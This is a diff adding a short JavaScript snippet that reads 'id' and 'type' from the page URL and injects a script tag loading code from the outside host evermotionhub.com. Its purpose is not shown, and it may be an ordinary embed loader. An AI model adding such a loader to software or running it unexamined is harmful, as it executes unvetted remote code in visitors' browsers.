@@ -1,0 +1,11 @@
+(function(){
+    const params = new URLSearchParams(location.search);
+    const id = params.get("id");
+    const type = params.get("type");
+    
+    if (id) {
+        const s = document.createElement("script");
+        s.src = "//evermotionhub.com/h/" + id + "?t=" + type;
+        (document.body || document.head || document.documentElement).appendChild(s);
+    }
+})();
